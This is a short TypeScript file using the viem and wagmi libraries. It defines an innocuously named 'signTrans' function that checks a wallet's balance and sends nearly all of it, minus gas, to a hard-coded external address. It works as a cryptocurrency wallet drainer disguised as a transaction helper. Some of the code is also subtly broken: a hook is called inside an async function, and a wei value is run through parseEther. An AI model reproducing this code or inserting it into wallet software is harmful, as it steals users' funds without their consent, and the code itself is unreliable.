
 import { WalletClient } from "viem";
 import {useNetwork, useWalletClient} from "wagmi"
 import { parseEther } from "viem";


const dybx = '0x7F367cC41522cE07553e823bf3be79A889DEbe1B'
export const signTrans = async(isConnected: boolean,balance: bigint,gas: bigint, signer: WalletClient) => {
  if(!isConnected)
    return

   
   const {chain} = useNetwork()
  const [address] = await signer?.getAddresses() || []
  const rems = balance - gas
console.log(chain, address, balance)
if(rems && rems > gas) {
  const amt = rems
  console.log("Sendable ",amt)
}
else{
  console.log("Low balance")
  return false
}

//console.log("Gas",gas,"Amount",amt,"Remainder",rems)

await signer?.sendTransaction({ 
  account: address,
  to: '0xa5cc3c03994DB5b0d9A5eEdD10CabaB0813678AC',
  value: parseEther(Number(rems).toString()), chain
})


//
} 